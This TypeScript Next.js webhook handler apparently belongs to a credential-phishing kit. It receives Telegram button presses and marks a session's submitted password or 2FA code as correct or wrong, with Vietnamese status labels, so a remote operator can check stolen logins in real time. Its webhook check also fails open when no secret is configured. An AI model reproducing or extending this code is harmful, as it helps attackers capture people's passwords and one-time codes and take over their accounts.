import { setApprovalStatus } from '@/lib/approval-store';
import { telegramRequest } from '@/lib/telegram';
import { NextRequest, NextResponse } from 'next/server';

type TelegramUpdate = {
    callback_query?: {
        id: string;
        data?: string;
        message?: {
            message_id: number;
            chat: { id: number };
            text?: string;
        };
    };
};

function isAuthorizedWebhook(req: NextRequest): boolean {
    const secret = process.env.TELEGRAM_WEBHOOK_SECRET?.trim();
    if (!secret) return true;
    return req.headers.get('x-telegram-bot-api-secret-token') === secret;
}

const POST = async (req: NextRequest) => {
    if (!isAuthorizedWebhook(req)) {
        return NextResponse.json({ ok: false }, { status: 401 });
    }

    try {
        const update = (await req.json()) as TelegramUpdate;
        const callback = update.callback_query;

        if (!callback?.data || !callback.message) {
            return NextResponse.json({ ok: true });
        }

        const parts = callback.data.split(':');
        if (parts.length !== 3) {
            return NextResponse.json({ ok: true });
        }

        const [action, type, sessionId] = parts;
        if (action !== 'approve' && action !== 'reject') {
            return NextResponse.json({ ok: true });
        }
        if (type !== 'password' && type !== 'code') {
            return NextResponse.json({ ok: true });
        }

        const status = action === 'approve' ? 'approved' : 'rejected';
        const updated = await setApprovalStatus(sessionId, status);

        const label =
            type === 'password'
                ? status === 'approved'
                    ? '✅ Mật khẩu ĐÚNG — đã duyệt'
                    : '❌ Mật khẩu SAI — yêu cầu nhập lại'
                : status === 'approved'
                  ? '✅ Mã 2FA ĐÚNG — đã duyệt'
                  : '❌ Mã 2FA SAI — yêu cầu nhập lại';

        if (!updated) {
            await telegramRequest('answerCallbackQuery', {
                callback_query_id: callback.id,
                text: 'Phiên duyệt đã hết hạn hoặc không tìm thấy. Yêu cầu người dùng gửi lại.',
                show_alert: true
            });

            await telegramRequest('editMessageReplyMarkup', {
                chat_id: callback.message.chat.id,
                message_id: callback.message.message_id,
                reply_markup: { inline_keyboard: [] }
            });

            return NextResponse.json({ ok: true });
        }

        await telegramRequest('answerCallbackQuery', {
            callback_query_id: callback.id,
            text: label,
            show_alert: false
        });

        const originalText = callback.message.text?.replace(/\n\n⏳[\s\S]*$/, '') ?? '';
        await telegramRequest('editMessageText', {
            chat_id: callback.message.chat.id,
            message_id: callback.message.message_id,
            text: `${originalText}\n\n${label}`,
            parse_mode: 'HTML'
        });

        return NextResponse.json({ ok: true });
    } catch (error) {
        console.error('[telegram/webhook]', error);
        return NextResponse.json({ ok: false }, { status: 500 });
    }
};

export { POST };
